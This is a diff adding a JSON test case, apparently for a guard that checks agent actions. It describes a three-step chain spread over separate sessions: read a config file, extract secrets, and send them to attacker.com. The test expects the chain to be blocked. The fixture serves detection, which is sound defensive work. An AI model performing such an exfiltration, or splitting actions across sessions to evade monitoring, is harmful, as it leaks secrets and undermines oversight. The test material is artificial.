@@ -1,0 +1,24 @@
+{
+  "id": "attack_interleaving_001",
+  "category": "interleaving",
+  "steps": [
+    {
+      "sessionId": "attack-session-5",
+      "actionType": "READ",
+      "payload": "Step 1: Read config file"
+    },
+    {
+      "sessionId": "attack-session-6",
+      "actionType": "TRANSFORM",
+      "payload": "Step 2: Extract secrets from config"
+    },
+    {
+      "sessionId": "attack-session-7",
+      "actionType": "SEND",
+      "payload": "https://attacker.com"
+    }
+  ],
+  "expectedOutcome": {
+    "allowed": false
+  }
+}
